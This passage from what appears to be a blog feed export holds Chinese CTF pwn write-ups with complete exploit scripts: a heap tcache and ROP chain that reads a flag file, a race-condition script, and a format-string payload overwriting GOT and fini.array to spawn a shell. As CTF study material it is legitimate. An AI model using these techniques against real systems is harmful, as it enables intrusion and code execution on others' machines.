punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\tgdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\tpause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add_</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input size: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input content: \"</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele_</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please input idx: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#0-8</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'Leaklibc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'gep'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#9</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#0-6</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>uaf<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>__malloc_hook <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>libcbase <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>env <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'environ'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>stdout <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libcbase<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'tcache'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'nextptr'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfdab1800</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>env<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>env<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#4</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>stack_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x128</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>dele_<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>dele_<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre></pre></td></tr><tr><td data-num=\"105\"></td><td><pre></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'nextptr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>pop_rdi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000023b6a</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>pop_rsi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x000000000002601f</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>pop_rdx_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000142c92</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>open_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>read_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>write_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>sendfile_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'sendfile'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>puts <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>flag_addr <span class=\"token operator\">=</span> stack_addr</pre></td></tr><tr><td data-num=\"121\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'./flag\\x00\\x00'</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre><span class=\"token comment\"># open('./flag', 0)</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>open_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre></pre></td></tr><tr><td data-num=\"125\"></td><td><pre><span class=\"token comment\"># read(3, stack_addr - 0x200, 0x50)</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdx_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre></pre></td></tr><tr><td data-num=\"128\"></td><td><pre><span class=\"token comment\"># write(1, stack_addr - 0x200, 0x50)</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre><span class=\"token comment\"># payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(stack_addr - 0x200) + p64(pop_rdx_ret) + p64(0x50) + p64(write_addr)</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre></pre></td></tr><tr><td data-num=\"131\"></td><td><pre><span class=\"token comment\"># payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(3) + p64(pop_rdx_ret) + p64(0) + p64(sendfile_addr)</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre></pre></td></tr><tr><td data-num=\"136\"></td><td><pre></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "å †æ‹“å±•æ”»å‡»",
                "orw",
                "å †æ ˆç»“åˆ"
            ]
        },
        {
            "id": "http://example.com/2023/09/22/new-pwn/",
            "url": "http://example.com/2023/09/22/new-pwn/",
            "title": "new_pwn",
            "date_published": "2023-09-22T12:04:31.000Z",
            "content_html": "<h1 id=\"è®°å½•ä¸¤é“pwné¢˜\"><a class=\"markdownIt-Anchor\" href=\"#è®°å½•ä¸¤é“pwné¢˜\">#</a> è®°å½•ä¸¤é“ PWN é¢˜</h1>\n<blockquote>\n<p>ç»™æ–°ç”Ÿå‡ºé¢˜ï¼Œå‡ºç´¯äº†ï¼Œéšä¾¿çœ‹äº†ä¸¤ä¸ª PWN é¢˜ï¼Œå‘ç°è¿™ä¸¤ä¸ª PWN éƒ½å€¼å¾—è®°å½•ä¸€ä¸‹</p>\n</blockquote>\n<ul>\n<li>ONE</li>\n</ul>\n<h2 id=\"nisactf-2022shop_pwn\"><a class=\"markdownIt-Anchor\" href=\"#nisactf-2022shop_pwn\">#</a> [NISACTF 2022]shop_pwn</h2>\n<p>é¢˜ç›®æ ‡ç­¾ï¼š</p>\n<p><img data-src=\"/img/pwnlianxi/20230922180317483.png\" alt=\"20230922180317483\"></p>\n<blockquote>\n<p>pthread_create å¤šçº¿ç¨‹ç«äº‰</p>\n</blockquote>\n<p><img data-src=\"/img/pwnlianxi/20230922180537307.png\" alt=\"20230922180537307\"></p>\n<p><strong>æ‰§è¡Œç¨‹åºå¦‚ä¸‹ï¼š</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922180732045.png\" alt=\"20230922180732045\"></p>\n<p><strong>æ”¾å…¥ IDA çœ‹ä¸€ä¸‹å…·ä½“çš„å‡½æ•°ï¼š</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922180849649.png\" alt=\"20230922180849649\"></p>\n<p><strong>çœ‹ä¸€ä¸‹ä¸»è¦çš„å‡½æ•°</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922181202034.png\" alt=\"20230922181202034\"></p>\n<p><img data-src=\"/img/pwnlianxi/20230922181325444.png\" alt=\"20230922181325444\"></p>\n<p><strong>è„šæœ¬å¦‚ä¸‹ï¼š</strong></p>\n<blockquote>\n<p>è¿™é‡Œåˆ©ç”¨äº† pthread_create åˆ›å»ºè¿›ç¨‹ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬æŒ‡ä»¤å‘é€å¾—å¿«çš„è¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®ç°ç¬¬ä¸€æ¬¡å”®å–åŠŸèƒ½æ‰§è¡Œçš„æ—¶å€™æ­£åœ¨ unsleepï¼Œæ¥ç€æ‰§è¡Œç¬¬äºŒæ¬¡å”®å–åŠŸèƒ½ï¼Œé‚£ä¹ˆå°±èƒ½å–å‡ºä¸¤æ¬¡å¾—åˆ°å¯ä»¥è´­ä¹° flag çš„é‡‘é’±äº†</p>\n</blockquote>\n<p><strong>pwntool çš„ sendline å‘é€æŒ‡ä»¤å¾ˆå¿«</strong></p>\n<pre><code>from pwn import *\ncontext(log_level='debug',arch='amd64', os='linux')\nr = remote('node5.anna.nssctf.cn',28929)\nr.sendline(&quot;3&quot;) \nr.sendline(&quot;0&quot;) \n\nr.sendline(&quot;3&quot;)\nr.sendline(&quot;0&quot;)  \n\nr.interactive()\n</code></pre>\n<p><strong>ç»“æœå¦‚ä¸‹ï¼š</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922181643187.png\" alt=\"20230922181643187\"></p>\n<ul>\n<li>two</li>\n</ul>\n<h2 id=\"ciscn-2019è¥¿å—pwn1\"><a class=\"markdownIt-Anchor\" href=\"#ciscn-2019è¥¿å—pwn1\">#</a> [CISCN 2019 è¥¿å—] PWN1</h2>\n<blockquote>\n<p>å½“ <code>RELRO</code>  ä¿æŠ¤ä¸º <code>NO RELRO</code>  çš„æ—¶å€™ï¼Œ <code>init.arrayã€fini.arrayã€got.plt</code>  å‡å¯è¯»å¯å†™ï¼›ä¸º <code>PARTIAL RELRO</code>  çš„æ—¶å€™ï¼Œ <code>ini.arrayã€fini.array</code>  å¯è¯»ä¸å¯å†™ï¼Œ <code>got.plt</code>  å¯è¯»å¯å†™ï¼›ä¸º <code>FULL RELRO</code>  æ—¶ï¼Œ <code>init.arrayã€fini.arrayã€got.plt</code>  å‡å¯è¯»ä¸å¯å†™ã€‚</p>\n</blockquote>\n<blockquote>\n<p>ç¨‹åºåœ¨åŠ è½½çš„æ—¶å€™ï¼Œä¼šä¾æ¬¡è°ƒç”¨ <code>init.array</code>  æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œåœ¨ç»“æŸçš„æ—¶å€™ï¼Œä¾æ¬¡è°ƒç”¨ <code>fini.array</code>  ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ</p>\n</blockquote>\n<blockquote>\n<p>å½“ç¨‹åºå‡ºç°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯éœ€è¦å†™ä¸¤æ¬¡æ‰èƒ½å®Œæˆæ”»å‡»ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥è€ƒè™‘æ”¹å†™ <code>fini.array</code>  ä¸­çš„å‡½æ•°æŒ‡é’ˆä¸º <code>main</code>  å‡½æ•°åœ°å€ï¼Œå¯ä»¥å†æ‰§è¡Œä¸€æ¬¡ <code>main</code>  å‡½æ•°ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ä¸ªæ•°ç»„çš„é•¿åº¦ä¸º <code>1</code> ï¼Œä¹Ÿå°±æ˜¯è¯´åªèƒ½å†™ä¸€ä¸ªåœ°å€ã€‚</p>\n</blockquote>\n<p><img data-src=\"/img/pwnlianxi/20230922182614061.png\" alt=\"20230922182614061\"></p>\n<p>32 ä½ç¨‹åºä¿®æ”¹ got è¡¨ã€‚</p>\n<p><strong>æ‰§è¡Œç¨‹åºå‚çœ‹åç§»ï¼š</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922183714065.png\" alt=\"20230922183714065\"></p>\n<p><strong>çœ‹ä¸€ä¸‹ IDA:</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922184018564.png\" alt=\"20230922184018564\"></p>\n<p><img data-src=\"/img/pwnlianxi/20230922184142420.png\" alt=\"20230922184142420\"></p>\n<p><strong>åˆ©ç”¨æ€è·¯ï¼š</strong></p>\n<p>é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å»ä¿®æ”¹ printf_gotï¼Œä¿®æ”¹ä¸º systemã€‚ä½†æ˜¯ç¨‹åºåªèƒ½æ‰§è¡Œä¸€æ¬¡ï¼Œæ‰€ä»¥ä¿®æ”¹å®Œåï¼Œç¨‹åºä¼šé€€å‡ºã€‚</p>\n<p>ä½†æ˜¯å¦‚æœå¦‚ä¸‹å›¾æ‰€ç¤º</p>\n<p><img data-src=\"/img/pwnlianxi/20230922184525768.png\" alt=\"20230922184525768\"></p>\n<p>æˆ‘ä»¬å°±å¯ä»¥å»ä¿®æ”¹ <code>fini.array</code> , å°†å…¶å‚æ•° 1ï¼Œç»™è¦†å†™æˆ mainï¼Œé‚£ä¹ˆç¨‹åºåœ¨é€€å‡ºåå°±ä¼šå†æ¬¡æ‰§è¡Œ main å‡½æ•°ã€‚</p>\n<p><strong>payloadï¼š</strong></p>\n<blockquote>\n<p>payload = b&quot;%2052c%13<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>h</mi><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">hn%31692c%14</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">n</span></span></span></span>hn%356c%15$hn&quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)</p>\n</blockquote>\n<p>é€šè¿‡ gdb å»çœ‹ä¸€çœ¼ payload è¿›å…¥ç¨‹åºçš„æƒ…å†µï¼š</p>\n<p><img data-src=\"/img/pwnlianxi/20230922185014496.png\" alt=\"20230922185014496\"></p>\n<p>å½“è¯»å…¥ pyload æ—¶çš„æƒ…å†µ</p>\n<p>è¿™æ—¶ç¨‹åºè¯»å…¥ payloadã€‚ç°åœ¨ got è¡¨é¡¹æŒ‡å‘çš„è¿˜æ˜¯ printf_pltã€‚</p>\n<p><img data-src=\"/img/pwnlianxi/20230922191625014.png\" alt=\"20230922191625014\"></p>\n<p>å½“æ‰§è¡Œåˆ° printf å‡½æ•°æ—¶ï¼Œprintf_got ä¿®æ”¹ä¸º system  fini_array çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¿®æ”¹ä¸º main</p>\n<p>å½“æˆ‘ä»¬ç¨‹åºç»“æŸæ—¶ï¼Œå°±ä¼šå†æ¬¡è·³è½¬åˆ° main å‡½æ•°å…¥å£ï¼Œåœ¨è¯»å…¥ /bin/shï¼Œæ¥ç€ä¼šåœ¨è°ƒç”¨ printf å‡½æ•°ï¼Œä¼šæ‰§è¡Œ system (/bin/sh)ï¼Œä»è€Œè·å– shell</p>\n<p><strong>exp å¦‚ä¸‹ï¼š</strong></p>\n<pre><code>from pwn import *\nr = remote('node5.anna.nssctf.cn',28467)\n# r = gdb.debug(&quot;./XNPWN1&quot;)\n# å¾€fini.array[0]å†™main@text, printf@gotå†™system@plt\npayload = b&quot;%2052c%13$hn%31692c%14$hn%356c%15$hn&quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)\nr.recvline()\n\nr.sendline(payload)\n\nr.sendline(&quot;/bin/sh&quot;)\nr.interactive()\n</code></pre>\n",
            "tags": [
                "æ ¼å¼åŒ–å­—ç¬¦ä¸²",
                "gotè¡¨"
            ]
        },
        {
            "id": "http://example.com/2023/09/22/picture/new-pwn/",
            "url": "http://example.com/2023/09/22/picture/new-pwn/",
            "title": "new_pwn",
            "date_published": "2023-09-22T11:51:06.000Z",
            "content_html": "<h1 id=\"è®°å½•ä¸¤é“pwné¢˜\"><a class=\"markdownIt-Anchor\" href=\"#è®°å½•ä¸¤é“pwné¢˜\">#</a> è®°å½•ä¸¤é“ PWN é¢˜</h1>\n<blockquote>\n<p>ç»™æ–°ç”Ÿå‡ºé¢˜ï¼Œå‡ºç´¯äº†ï¼Œéšä¾¿çœ‹äº†ä¸¤ä¸ª PWN é¢˜ï¼Œå‘ç°è¿™ä¸¤ä¸ª PWN éƒ½å€¼å¾—è®°å½•ä¸€ä¸‹</p>\n</blockquote>\n<ul>\n<li>ONE</li>\n</ul>\n<h2 id=\"nisactf-2022shop_pwn\"><a class=\"markdownIt-Anchor\" href=\"#nisactf-2022shop_pwn\">#</a> [NISACTF 2022]shop_pwn</h2>\n<p>é¢˜ç›®æ ‡ç­¾ï¼š</p>\n<p><img data-src=\"/img/pwnlianxi/20230922180317483.png\" alt=\"20230922180317483\"></p>\n<blockquote>\n<p>pthread_create å¤šçº¿ç¨‹ç«äº‰</p>\n</blockquote>\n<p><img data-src=\"/img/pwnlianxi/20230922180537307.png\" alt=\"20230922180537307\"></p>\n<p><strong>æ‰§è¡Œç¨‹åºå¦‚ä¸‹ï¼š</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922180732045.png\" alt=\"20230922180732045\"></p>\n<p><strong>æ”¾å…¥ IDA çœ‹ä¸€ä¸‹å…·ä½“çš„å‡½æ•°ï¼š</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922180849649.png\" alt=\"20230922180849649\"></p>\n<p><strong>çœ‹ä¸€ä¸‹ä¸»è¦çš„å‡½æ•°</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922181202034.png\" alt=\"20230922181202034\"></p>\n<p><img data-src=\"/img/pwnlianxi/20230922181325444.png\" alt=\"20230922181325444\"></p>\n<p><strong>è„šæœ¬å¦‚ä¸‹ï¼š</strong></p>\n<blockquote>\n<p>è¿™é‡Œåˆ©ç”¨äº† pthread_create åˆ›å»ºè¿›ç¨‹ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬æŒ‡ä»¤å‘é€å¾—å¿«çš„è¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®ç°ç¬¬ä¸€æ¬¡å”®å–åŠŸèƒ½æ‰§è¡Œçš„æ—¶å€™æ­£åœ¨ unsleepï¼Œæ¥ç€æ‰§è¡Œç¬¬äºŒæ¬¡å”®å–åŠŸèƒ½ï¼Œé‚£ä¹ˆå°±èƒ½å–å‡ºä¸¤æ¬¡å¾—åˆ°å¯ä»¥è´­ä¹° flag çš„é‡‘é’±äº†</p>\n</blockquote>\n<p><strong>pwntool çš„ sendline å‘é€æŒ‡ä»¤å¾ˆå¿«</strong></p>\n<pre><code>from pwn import *\ncontext(log_level='debug',arch='amd64', os='linux')\nr = 